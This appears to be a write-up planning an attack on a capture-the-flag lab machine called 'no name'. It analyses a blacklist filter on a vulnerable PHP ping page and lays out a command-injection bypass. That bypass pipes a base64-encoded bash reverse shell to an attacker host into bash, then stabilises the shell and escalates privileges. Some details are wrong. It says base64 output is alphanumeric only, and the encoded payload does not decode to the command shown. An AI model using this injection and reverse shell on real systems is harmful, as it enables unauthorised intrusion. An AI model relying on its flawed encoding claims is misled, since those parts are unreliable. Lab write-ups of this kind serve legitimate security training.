# Penetration Testing Strategy: Target "no name"

## 1. Initial Assessment & Vulnerability Identification

The primary attack surface is the web application running on port 80 (Apache 2.4.29). Initial enumeration reveals two key administrative areas: `/admin` and `superadmin.php`.

### Key Findings:

- **Breadcrumbs:** A passphrase `harder` is found in the HTML source of `/admin`.
- **Vulnerability:** `superadmin.php` implements a "ping" functionality that is vulnerable to Command Injection.
- **Security Control:** The application uses a blacklist-based filter to prevent common injection attacks.

---

## 2. Technical Analysis of the Filter

The source code for `superadmin.php` reveals a critical flaw in its security implementation:

```php
$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
$pinged=$_POST['pinger'];
$newStr = str_replace($word, "", $pinged);
if(strcmp($pinged, $newStr) == 0) { ... }
```

### Conclusions on the Filter:

1.  **Strict Equality Check:** The use of `strcmp` ensures that if _any_ blacklisted word is present, the command is blocked. This prevents simple obfuscation like `b''in`.
2.  **Missing "Pipe" (`|`):** The developer failed to include the pipe character in the blacklist, allowing for command chaining.
3.  **Path Restriction:** By blocking `/` and `bin`, the developer effectively prevents the execution of absolute paths and most common shells.
4.  **Networking Restriction:** Blocking `&` and `nc` prevents standard backgrounding and common reverse shell tools.

---

## 3. Strategic Approach: The Base64 Bypass

The ideal solution to bypass this specific filter is **Base64 encoding**. This approach treats the malicious payload as "inert data" during the validation phase and only "activates" it as code during execution.

### Rationale:

- **Character Smuggling:** Base64 allows for the representation of forbidden characters (like `/` and `&`) using only alphanumeric characters.
- **Bypassing `strcmp`:** The encoded string will not match any of the forbidden words in the `$word` array, satisfying the security check.
- **Post-Validation Execution:** By piping the encoded string into `base64 -d | bash`, we reconstruct the forbidden commands _after_ the PHP script has already approved the input.
- **Tool Availability:** The `base64` utility is standard on Linux (Ubuntu), ensuring the payload will execute without additional dependencies.

---

## 4. Execution Roadmap (Foothold)

### Step 1: Steganographic Extraction

Before exploitation, I will use the passphrase `harder` to extract any hidden data from the images found in `/admin` (e.g., `haclabs.jpeg`). This may provide a local username or further context for privilege escalation.

### Step 2: Payload Engineering

Construct a Base64-encoded reverse shell payload.

- **Original:** `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
- **Encoded:** `YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRAQ0tFUl9JUC9QT1JUIDA+JjE=` (Note: Adjust padding/spacing if a `/` appears in the output).

### Step 3: Injection

Submit the following payload into the `pinger` field:
`127.0.0.1 | echo <BASE64_PAYLOAD> | base64 -d | bash`

### Step 4: Stabilization

Once the reverse shell is received, immediately upgrade the TTY:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

---

## 5. Post-Exploitation (Anticipated)

Following the initial foothold, the focus will shift to:

1.  Searching for hidden files (as mentioned in the scope).
2.  Investigating SUID binaries or sudo misconfigurations (`sudo -l`).
3.  Leveraging any credentials discovered in Step 1 to pivot to a higher-privileged user.
